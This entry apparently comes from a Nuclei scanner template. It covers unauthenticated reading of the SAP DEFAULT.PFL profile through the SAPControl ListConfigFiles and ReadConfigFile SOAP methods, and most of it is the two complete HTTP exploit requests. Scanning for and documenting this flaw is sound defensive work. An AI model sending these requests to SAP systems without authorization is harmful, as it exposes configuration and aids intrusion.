# Vulnerability: SAPControl Read DEFAULT.PFL - Disclosure
**Classification:** SAP
**Source:** Nuclei Template (`sap-readconfigfile-disclosure.yaml`)

## Description
Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the ReadConfigFile web method in combination with an unprotected ListConfigFiles call, allowing unauthenticated reading of the global DEFAULT.PFL profile.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
SOAPAction: '""'

<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
      <enableSession>true</enableSession>
    </sapsess:Session>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns1:ListConfigFiles xmlns:ns1="urn:SAPControl"/>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
SOAPAction: '""'

<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
      <enableSession>true</enableSession>
    </sapsess:Session>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns1:ReadConfigFile xmlns:ns1="urn:SAPControl">
      <filename>{{default_pfl}}</filename>
    </ns1:ReadConfigFile>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

